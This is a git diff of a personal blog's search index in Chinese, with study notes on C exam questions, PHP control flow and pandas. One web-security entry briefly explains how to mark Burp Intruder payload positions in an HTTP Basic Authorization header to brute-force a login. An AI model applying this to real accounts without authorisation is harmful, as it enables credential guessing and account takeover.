@@ -133,11 +133,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ai大模型结合犯罪脚本的相关理解</title>
-    <url>/2025/03/11/ai%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%BB%93%E5%90%88%E7%8A%AF%E7%BD%AA%E8%84%9A%E6%9C%AC%E7%9A%84%E7%9B%B8%E5%85%B3%E7%90%86%E8%A7%A3/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>wsl环境ollama运行ai</title>
     <url>/2025/01/20/ai/</url>
     <content><![CDATA[<h3 id="初见"><a href="#初见" class="headerlink" title="初见"></a>初见</h3><img src="/2025/01/20/ai/image-20250120232757713.png" class="" title="image-20250120232757713">
@@ -369,25 +364,6 @@
       </categories>
       <tags>
         <tag>ollama</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bp爆破中的变量赋值</title>
-    <url>/2025/01/13/bp%E7%88%86%E7%A0%B4%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/</url>
-    <content><![CDATA[<h3 id="有关密码用户名的提交"><a href="#有关密码用户名的提交" class="headerlink" title="有关密码用户名的提交"></a>有关密码用户名的提交</h3><ul>
-<li>密码提交：<br>比如在web容器内部有输入框让你输入admin和密码,这些数据提交进去是在HTTP请求报文或HTTP请求头中的Authorization结构(用于身份验证和授权信息传递),<br>可以发现admin与password之间使用:隔开,并且注意编码格式。</li>
-<li>变量赋值的提醒<br>变量赋值是用$$分开的,两个$符号之间的字符即为变量的值,比如:</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic §a§:§password§</span><br></pre></td></tr></table></figure>
-<p><strong>注释</strong>:这里把冒号放在a变量里面:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic $a:$$password$</span><br></pre></td></tr></table></figure>
-<p>也符合HTTP协议的格式。怎么顺眼怎么来</p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>bp爆破</tag>
       </tags>
   </entry>
   <entry>
@@ -1071,6 +1047,25 @@
       </tags>
   </entry>
   <entry>
+    <title>bp爆破中的变量赋值</title>
+    <url>/2025/01/13/bp%E7%88%86%E7%A0%B4%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/</url>
+    <content><![CDATA[<h3 id="有关密码用户名的提交"><a href="#有关密码用户名的提交" class="headerlink" title="有关密码用户名的提交"></a>有关密码用户名的提交</h3><ul>
+<li>密码提交：<br>比如在web容器内部有输入框让你输入admin和密码,这些数据提交进去是在HTTP请求报文或HTTP请求头中的Authorization结构(用于身份验证和授权信息传递),<br>可以发现admin与password之间使用:隔开,并且注意编码格式。</li>
+<li>变量赋值的提醒<br>变量赋值是用$$分开的,两个$符号之间的字符即为变量的值,比如:</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic §a§:§password§</span><br></pre></td></tr></table></figure>
+<p><strong>注释</strong>:这里把冒号放在a变量里面:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic $a:$$password$</span><br></pre></td></tr></table></figure>
+<p>也符合HTTP协议的格式。怎么顺眼怎么来</p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>bp爆破</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>c语言函数的调用</title>
     <url>/2025/01/16/c%E8%AF%ADy%E8%A8%80%E5%AD%A6%E4%B9%A01/</url>
     <content><![CDATA[<h3 id="c语言函数的调用"><a href="#c语言函数的调用" class="headerlink" title="c语言函数的调用"></a>c语言函数的调用</h3><h4 id="c语言函数调用的步奏"><a href="#c语言函数调用的步奏" class="headerlink" title="c语言函数调用的步奏"></a>c语言函数调用的步奏</h4><h5 id="首先-声明函数"><a href="#首先-声明函数" class="headerlink" title="首先,声明函数"></a>首先,声明函数</h5><p>声明函数在mian函数外进行完成.</p>
@@ -1097,11 +1092,6 @@
   <entry>
     <title>c语言操作题</title>
     <url>/2025/03/02/c%E8%AF%AD%E8%A8%80%E6%93%8D%E4%BD%9C%E9%A2%98/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>c语言细节</title>
-    <url>/2025/02/08/c%E8%AF%AD%E8%A8%80%E7%BB%86%E8%8A%82/</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
@@ -1270,9 +1260,14 @@
       </tags>
   </entry>
   <entry>
+    <title>c语言细节</title>
+    <url>/2025/02/08/c%E8%AF%AD%E8%A8%80%E7%BB%86%E8%8A%82/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>c语言选择题</title>
     <url>/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/</url>
-    <content><![CDATA[<h1 id="备考c语言选择题-持续更新-25-3-2"><a href="#备考c语言选择题-持续更新-25-3-2" class="headerlink" title="备考c语言选择题(持续更新)25.3.2"></a>备考c语言选择题(持续更新)25.3.2</h1><h2 id="3-2"><a href="#3-2" class="headerlink" title="3.2"></a>3.2</h2><h3 id="合法标识符"><a href="#合法标识符" class="headerlink" title="合法标识符"></a>合法标识符</h3><ul>
+    <content><![CDATA[<h1 id="备考c语言选择题-持续更新-25-3-2"><a href="#备考c语言选择题-持续更新-25-3-2" class="headerlink" title="备考c语言选择题(持续更新)25.3.2"></a>备考c语言选择题(持续更新)25.3.2</h1><h1 id="3-2"><a href="#3-2" class="headerlink" title="3.2"></a>3.2</h1><h3 id="合法标识符"><a href="#合法标识符" class="headerlink" title="合法标识符"></a>合法标识符</h3><ul>
 <li>记住:下划线可以开头,数字不可以<code>void</code>这种关键字也不行。</li>
 </ul>
 <h3 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h3><ul>
@@ -1526,26 +1521,35 @@ int main()&#123;
 </ul>
 <h4 id="自定义数据结构里面的指针"><a href="#自定义数据结构里面的指针" class="headerlink" title="自定义数据结构里面的指针"></a>自定义数据结构里面的指针</h4><ul>
 <li>有以下例题:</li>
-<li><style>.eldvnqmkntdt{zoom:150%;}</style><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250305135039466.png" class="eldvnqmkntdt" alt="image-20250305135039466"></li>
+<li><style>.mqoppdbjosua{zoom:150%;}</style><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250305135039466.png" class="mqoppdbjosua" alt="image-20250305135039466"></li>
 <li>要点一:对于<code>struct st a[3] = &#123;5,&amp;a[0], 6,&amp;a[1], 7,&amp;a[2]&#125;, *p;</code>这里由于该结构在初始化的时候，需要两个值来初始化，所以<code>5,&amp;a[0]</code>就构成了数组<code>a</code>的第一个元素<code>a[0]</code>的初始化内容 ，<code>6,&amp;a[1]</code> 、<code>7,&amp;a[2]</code>分别对应<code>a[1]</code>和<code>a[2]</code>的初始化内容。</li>
 <li>要点二:这里对<code>st</code>数据结构数组的值的导入，比如:<code>5,&amp;a[0]</code>,这里第二个值为<code>&amp;a[0]</code>，就是对<code>st *next</code>的赋值，即指向的下一个元素是它本身。</li>
 <li>要点三:指针的数据结构必须和要指向的目标元素的类型相同，才可以进行指向。</li>
 <li>要点四:<code>p=&amp;a[0]</code>,这里就是指向数组a的第一个元素的的地址，包含：<code>(int n ,struct st *next)</code>,我们对指针进行移动:<code>(++p)</code>,再进行指向:<code>-&gt;</code>,<strong>其中:<code>-&gt;</code>这个方法就已经对数据结构其中的元素进行了解包</strong>,所以不需要<code>*p</code>对数据解包了。</li>
 </ul>
-<h2 id="3-3"><a href="#3-3" class="headerlink" title="3.3"></a>3.3</h2><h3 id="数组特性"><a href="#数组特性" class="headerlink" title="数组特性"></a>数组特性</h3><ul>
+<h1 id="3-3"><a href="#3-3" class="headerlink" title="3.3"></a>3.3</h1><h3 id="数组特性"><a href="#数组特性" class="headerlink" title="数组特性"></a>数组特性</h3><ul>
 <li>比如该题:</li>
 <li><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250303074823302.png" class="" title="image-20250303074823302"></li>
 <li>如解析所示,不多说</li>
 </ul>
-<h2 id="3-4"><a href="#3-4" class="headerlink" title="3.4"></a>3.4</h2><h3 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h3><ul>
+<h1 id="3-4"><a href="#3-4" class="headerlink" title="3.4"></a>3.4</h1><h3 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h3><ul>
 <li><p>如下例题:</p>
 </li>
 <li><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250304074758892.png" class="" title="image-20250304074758892"></li>
 </ul>
-<h2 id="3-5"><a href="#3-5" class="headerlink" title="3.5"></a>3.5</h2><h3 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h3><h4 id="就是一个简单的替换"><a href="#就是一个简单的替换" class="headerlink" title="就是一个简单的替换"></a>就是一个简单的替换</h4><ul>
+<h1 id="3-5"><a href="#3-5" class="headerlink" title="3.5"></a>3.5</h1><h3 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h3><h4 id="就是一个简单的替换"><a href="#就是一个简单的替换" class="headerlink" title="就是一个简单的替换"></a>就是一个简单的替换</h4><ul>
 <li>我们可以看如下例题:</li>
 <li><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250305133059085.png" class="" title="image-20250305133059085"></li>
 <li>由题可知:<code>F(5)</code>会被替换为:<code>F(x) 2.84+x</code>,在这道例题里面,<code>F(x)</code>被替换之后，是直接单纯被替换:会变成:<code>2.84+x*2</code>,不会自己多加什么运算顺序,不会变成:<code>(2.84+x)*2</code>。</li>
+</ul>
+<h1 id="3-17"><a href="#3-17" class="headerlink" title="3.17"></a>3.17</h1><h2 id="结构数据-持续更新"><a href="#结构数据-持续更新" class="headerlink" title="结构数据(持续更新)"></a>结构数据(持续更新)</h2><h3 id="数组赋值"><a href="#数组赋值" class="headerlink" title="数组赋值"></a>数组赋值</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">st</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">st</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">st</span> <span class="title">a</span>[3] =</span> &#123; <span class="number">5</span>,&amp;a[<span class="number">0</span>], <span class="number">6</span>,&amp;a[<span class="number">1</span>], <span class="number">7</span>,&amp;a[<span class="number">2</span>] &#125;, *p;</span><br><span class="line">p = &amp;a[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-20"><a href="#3-20" class="headerlink" title="3.20"></a>3.20</h2><h3 id="不同进制数的表述方法"><a href="#不同进制数的表述方法" class="headerlink" title="不同进制数的表述方法"></a>不同进制数的表述方法</h3><ul>
+<li>二进制：<code>0b</code>或<code>0B</code></li>
+<li>八进制：0开头,如<code>010</code></li>
+<li>十六进制：<code>0x</code>开头</li>
 </ul>
 ]]></content>
       <categories>
@@ -1553,34 +1557,6 @@ int main()&#123;
       </categories>
       <tags>
         <tag>备考二级选择题</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>if代码执行机制</title>
-    <url>/2025/01/14/if%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6/</url>
-    <content><![CDATA[<h3 id="这里我们总结if代码块中布尔值的多少对程序进程的影响"><a href="#这里我们总结if代码块中布尔值的多少对程序进程的影响" class="headerlink" title="这里我们总结if代码块中布尔值的多少对程序进程的影响"></a>这里我们总结if代码块中布尔值的多少对程序进程的影响</h3><h4 id="if条件小括号内的情况"><a href="#if条件小括号内的情况" class="headerlink" title="if条件小括号内的情况"></a>if条件小括号内的情况</h4><h5 id="if括号内为false"><a href="#if括号内为false" class="headerlink" title="if括号内为false"></a>if括号内为false</h5><p>毫无疑问,if代码块里面的代码不会继续运行,此时整个程序会跳过条件括号里为false的这个if代码块继续往下运行。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This will not be printed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This will be printed because the if condition was false&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p>在上述代码中，因为 if 条件为 false，echo “This will not be printed”; 不会被执行，程序直接执行 echo “This will be printed because the if condition was false”。</p>
-<h5 id="if括号里为true"><a href="#if括号里为true" class="headerlink" title="if括号里为true"></a>if括号里为true</h5><p>当 if 括号内条件为 true 时，if 代码块内的代码会执行。但这并不意味着整个程序会不受影响地继续运行。<br>取决于 if 代码块内的代码：<br>如果 if 代码块内有 return、exit 或 die 等终止程序或函数的语句，程序或函数的执行会被终止。<br>比如:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exampleFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This will be printed&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This will not be printed because of the return statement&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">exampleFunction</span>();</span><br></pre></td></tr></table></figure>
-<p>在这种情况下,if代码块内因为有return,所以在同一函数代码空间的echo语句不会被执行。也就是在这一层代码空间内，程序的运行确实被终止了。<br>这就引出了我们接下来要说的一种情况:</p>
-<h4 id="return的辨析"><a href="#return的辨析" class="headerlink" title="return的辨析"></a>return的辨析</h4><p>其实我们在这里可以把return,die,exit这几个对程序运行都有影响的一起说了。<br>1.首先是return，它在,不管是返回什么布尔值,都会使<strong>同一空间代码</strong>停止运行,<br>如果在函数内,它就会使return之后的代码无法运行,如果在类中,也是一样，而我们不推荐把它放在全局代码空间中,这样会使得整个程序停止运行。<br>例如:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exampleFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Before return&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// 这里的条件可以根据需要修改</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;After return&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">exampleFunction</span>();</span><br></pre></td></tr></table></figure>
-<p>在函数外依然可以调用这个函数,函数外并没有因为前面函数里面有return而被打断,但是这里就只会<br>输出:Before return,不会输出After return<br>在类,即对象class里面情况类似</p>
-<p>在文件包含的情况下:<br>在被包含文件:”included_file.php”内:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Before return in included file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After return in included file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>再在另外一个文件中包含它:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;included_file.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is after including the file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>只会输出:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Before return in included file</span><br><span class="line">This is after including the file</span><br></pre></td></tr></table></figure>
-<p>即:在被包含文件自己代码中,return后面的After return in included file没有输出，程序终止。<br>但是并没有影响去包含这个文件的主文件在后方的”This is after including the file”这句话的输出,<br>所以在文件包含的情景下,return也只会终止自己文件后方的代码，对主文件没有影响。</p>
-<p>2.而die,exit则会直接使整个程序不可运行,没有代码空间的说法。</p>
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>php条件函数</tag>
       </tags>
   </entry>
   <entry>
@@ -1623,14 +1599,31 @@ int main()&#123;
       </tags>
   </entry>
   <entry>
-    <title>linux基础</title>
-    <url>/2025/01/11/linux%E5%9F%BA%E7%A1%80/</url>
-    <content><![CDATA[]]></content>
+    <title>if代码执行机制</title>
+    <url>/2025/01/14/if%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6/</url>
+    <content><![CDATA[<h3 id="这里我们总结if代码块中布尔值的多少对程序进程的影响"><a href="#这里我们总结if代码块中布尔值的多少对程序进程的影响" class="headerlink" title="这里我们总结if代码块中布尔值的多少对程序进程的影响"></a>这里我们总结if代码块中布尔值的多少对程序进程的影响</h3><h4 id="if条件小括号内的情况"><a href="#if条件小括号内的情况" class="headerlink" title="if条件小括号内的情况"></a>if条件小括号内的情况</h4><h5 id="if括号内为false"><a href="#if括号内为false" class="headerlink" title="if括号内为false"></a>if括号内为false</h5><p>毫无疑问,if代码块里面的代码不会继续运行,此时整个程序会跳过条件括号里为false的这个if代码块继续往下运行。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This will not be printed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This will be printed because the if condition was false&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>在上述代码中，因为 if 条件为 false，echo “This will not be printed”; 不会被执行，程序直接执行 echo “This will be printed because the if condition was false”。</p>
+<h5 id="if括号里为true"><a href="#if括号里为true" class="headerlink" title="if括号里为true"></a>if括号里为true</h5><p>当 if 括号内条件为 true 时，if 代码块内的代码会执行。但这并不意味着整个程序会不受影响地继续运行。<br>取决于 if 代码块内的代码：<br>如果 if 代码块内有 return、exit 或 die 等终止程序或函数的语句，程序或函数的执行会被终止。<br>比如:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exampleFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This will be printed&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This will not be printed because of the return statement&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">exampleFunction</span>();</span><br></pre></td></tr></table></figure>
+<p>在这种情况下,if代码块内因为有return,所以在同一函数代码空间的echo语句不会被执行。也就是在这一层代码空间内，程序的运行确实被终止了。<br>这就引出了我们接下来要说的一种情况:</p>
+<h4 id="return的辨析"><a href="#return的辨析" class="headerlink" title="return的辨析"></a>return的辨析</h4><p>其实我们在这里可以把return,die,exit这几个对程序运行都有影响的一起说了。<br>1.首先是return，它在,不管是返回什么布尔值,都会使<strong>同一空间代码</strong>停止运行,<br>如果在函数内,它就会使return之后的代码无法运行,如果在类中,也是一样，而我们不推荐把它放在全局代码空间中,这样会使得整个程序停止运行。<br>例如:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exampleFunction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Before return&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// 这里的条件可以根据需要修改</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;After return&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">exampleFunction</span>();</span><br></pre></td></tr></table></figure>
+<p>在函数外依然可以调用这个函数,函数外并没有因为前面函数里面有return而被打断,但是这里就只会<br>输出:Before return,不会输出After return<br>在类,即对象class里面情况类似</p>
+<p>在文件包含的情况下:<br>在被包含文件:”included_file.php”内:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Before return in included file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After return in included file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>再在另外一个文件中包含它:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;included_file.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is after including the file&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>只会输出:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Before return in included file</span><br><span class="line">This is after including the file</span><br></pre></td></tr></table></figure>
+<p>即:在被包含文件自己代码中,return后面的After return in included file没有输出，程序终止。<br>但是并没有影响去包含这个文件的主文件在后方的”This is after including the file”这句话的输出,<br>所以在文件包含的情景下,return也只会终止自己文件后方的代码，对主文件没有影响。</p>
+<p>2.而die,exit则会直接使整个程序不可运行,没有代码空间的说法。</p>
+]]></content>
       <categories>
-        <category>Linux</category>
+        <category>php</category>
       </categories>
       <tags>
-        <tag>基本符号</tag>
+        <tag>php条件函数</tag>
       </tags>
   </entry>
   <entry>
@@ -1675,6 +1668,147 @@ int main()&#123;
       </categories>
       <tags>
         <tag>langchain</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux基础</title>
+    <url>/2025/01/11/linux%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>基本符号</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pandas库学习(持续更新)</title>
+    <url>/2025/03/08/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="python-pandas库学习"><a href="#python-pandas库学习" class="headerlink" title="python pandas库学习"></a>python pandas库学习</h1><h2 id="apply-方法"><a href="#apply-方法" class="headerlink" title="apply() 方法"></a><code>apply()</code> 方法</h2><p><code>pandas</code> 中的 <code>apply</code> 方法是一个非常灵活且强大的工具，可用于对 <code>Series</code> 或 <code>DataFrame</code> 对象中的元素、行或列应用自定义函数。下面为你从多个方面详细介绍其用法。</p>
+<h3 id="1-对-Series-对象使用-apply"><a href="#1-对-Series-对象使用-apply" class="headerlink" title="1. 对 Series 对象使用 apply"></a>1. 对 <code>Series</code> 对象使用 <code>apply</code></h3><p><code>Series</code> 是一维带标签数组，<code>apply</code> 可对其中每个元素应用指定函数。</p>
+<h4 id="基础示例"><a href="#基础示例" class="headerlink" title="基础示例"></a>基础示例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 Series</span></span><br><span class="line">s = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个简单的函数，用于将元素乘以 2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">multiply_by_two</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x * <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 方法应用函数</span></span><br><span class="line">result = s.apply(multiply_by_two)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，<code>multiply_by_two</code> 函数被应用到 <code>Series</code> 的每个元素上，将每个元素都乘以 2。</p>
+<h4 id="使用匿名函数（lambda-函数）"><a href="#使用匿名函数（lambda-函数）" class="headerlink" title="使用匿名函数（lambda 函数）"></a>使用匿名函数（<code>lambda</code> 函数）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">s = pd.Series([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="comment"># 使用 lambda 函数进行同样的操作</span></span><br><span class="line">result = s.apply(<span class="keyword">lambda</span> x: x * <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p><code>lambda</code> 函数让代码更简洁，适合实现简单逻辑。</p>
+<h3 id="2-对-DataFrame-对象使用-apply"><a href="#2-对-DataFrame-对象使用-apply" class="headerlink" title="2. 对 DataFrame 对象使用 apply"></a>2. 对 <code>DataFrame</code> 对象使用 <code>apply</code></h3><p><code>DataFrame</code> 是二维表格型数据结构，<code>apply</code> 可按行或列应用函数，通过 <code>axis</code> 参数控制。</p>
+<h4 id="按列应用函数（axis-0）"><a href="#按列应用函数（axis-0）" class="headerlink" title="按列应用函数（axis = 0）"></a>按列应用函数（<code>axis = 0</code>）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 DataFrame</span></span><br><span class="line">df = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，用于计算每列的和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_sum</span>(<span class="params">column</span>):</span><br><span class="line">    <span class="keyword">return</span> column.<span class="built_in">sum</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 按列应用函数</span></span><br><span class="line">result = df.apply(column_sum, axis=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>这里 <code>axis = 0</code> 表示按列操作，函数会依次对每列进行计算。</p>
+<h4 id="按行应用函数（axis-1）"><a href="#按行应用函数（axis-1）" class="headerlink" title="按行应用函数（axis = 1）"></a>按行应用函数（<code>axis = 1</code>）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，用于计算每行的和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">row_sum</span>(<span class="params">row</span>):</span><br><span class="line">    <span class="keyword">return</span> row[<span class="string">&#x27;A&#x27;</span>] + row[<span class="string">&#x27;B&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 apply 按行应用函数</span></span><br><span class="line">result = df.apply(row_sum, axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p><code>axis = 1</code> 表示按行操作，函数会依次对每行进行计算。</p>
+<h3 id="3-传递额外参数"><a href="#3-传递额外参数" class="headerlink" title="3. 传递额外参数"></a>3. 传递额外参数</h3><p><code>apply</code> 方法允许传递额外参数给自定义函数。</p>
